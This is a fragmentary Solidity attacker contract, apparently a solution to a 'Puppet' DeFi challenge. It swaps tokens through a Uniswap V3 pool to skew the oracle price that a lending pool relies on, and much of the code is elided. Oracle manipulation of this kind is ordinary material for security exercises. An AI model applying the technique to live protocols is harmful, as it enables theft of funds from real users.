...
contract PV3Attacker is IUniswapV3SwapCallback {
    ...
    function callSwap(int256 _amount) public {
        v3pool.swap(
            address(this), // this contract is the recipient of the swap
            false, //zeroForOne: we swap from token => WETH => zeroForOne = false
            _amount,
            TickMath.MAX_SQRT_RATIO - 1, //sqrtPriceLimitX96 => we want to swap all out tokens, so, we set this to the max allowed value
            "" // we provide no data
        );
    }
    ...
    function uniswapV3SwapCallback(
        ...
        //we need to send all the tokens we want to swap to the pool in the same txn (swap)
    ...
    {    
        //calculate the amount of WETH we need to deposit into the Puppet pool  
    ...
    {
        //prices are stored in the v3Pool in Oracle.Observation : from current timestamp to last recorded TS
